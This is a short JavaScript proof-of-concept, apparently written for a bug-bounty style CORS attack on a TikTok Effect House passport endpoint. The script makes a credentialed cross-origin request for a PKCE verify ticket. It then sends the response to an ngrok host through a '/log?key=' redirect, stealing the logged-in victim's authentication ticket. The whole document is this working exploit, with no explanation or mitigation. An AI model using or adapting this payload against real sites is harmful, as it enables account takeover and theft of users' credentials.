var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("GET", "https://effecthouse.tiktok.com/passport/web/gen_pkce_verify_ticket/?aid=1459&code_challenge=fde6822cb51ac71e2527152489231de2&language=en");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send();

function reqListener() {
    location='//e5cc-202-162-37-174.ngrok-free.app/log?key='+this.responseText; 
};
